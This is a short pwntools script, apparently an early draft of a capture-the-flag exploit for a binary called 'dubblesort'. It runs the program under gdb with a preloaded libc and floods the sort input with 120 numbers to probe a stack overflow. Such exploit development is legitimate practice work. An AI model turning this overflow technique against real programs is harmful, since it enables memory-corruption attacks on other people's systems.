from pwn import *

libc = ELF('libc_32.so.6')
dubblesort = ELF('dubblesort')


class Prompts:
    NAME = 'name :'
    NUMS_COUNT = 'sort :'
    NUM = 'number : '


def main():
    p = gdb.debug(
        dubblesort.path,
        '''
        b *main+0xe5
        c
        ''',
        env=dict(LD_PRELOAD=libc.path)
    )
    num_count = 120
    p.sendafter(Prompts.NAME, 'egk\n')
    p.sendafter(Prompts.NUMS_COUNT, str(num_count) + '\n')
    for i in range(1, num_count + 1):
        p.sendafter(Prompts.NUM, str(i * 4) + '\n')
        print(f'Sent: {i}')


if __name__ == "__main__":
    main()
